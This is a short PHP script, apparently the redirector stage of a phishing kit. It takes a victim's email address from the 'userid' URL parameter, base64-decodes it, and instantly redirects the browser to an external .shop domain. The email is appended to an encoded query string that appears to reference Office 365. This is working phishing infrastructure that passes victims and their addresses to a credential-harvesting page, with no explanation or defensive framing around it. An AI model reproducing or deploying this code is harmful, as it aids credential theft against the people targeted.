<?php
function isBase64($data)
{
    if (base64_encode(base64_decode($data)) === $data) {
        return true;
    } else {
        return false;
    }
}

function decode($email){
    
    if(isBase64($email)){
       $email = base64_decode($email,false);
    }
      
       header( "refresh:0;url=https://adipisci.shop/m/?c3Y9bzM2NV8xX25vbSZyYW5kPWFVMHpObVZtT1RsdmJqaHdibTVOT1dOME4zaz0mdWlkPVVTRVIyNzA2MjAyNFVOSVFVRTEwNDYwNjI3MzkyMDI0MjAyNDA2Mjc0NjEwMzk=N0123N".$email);

}
if(isset($_GET['userid']) && !empty($_GET['userid'])){
   $email = $_GET['userid'];
   decode($email);
}
   
   
?>
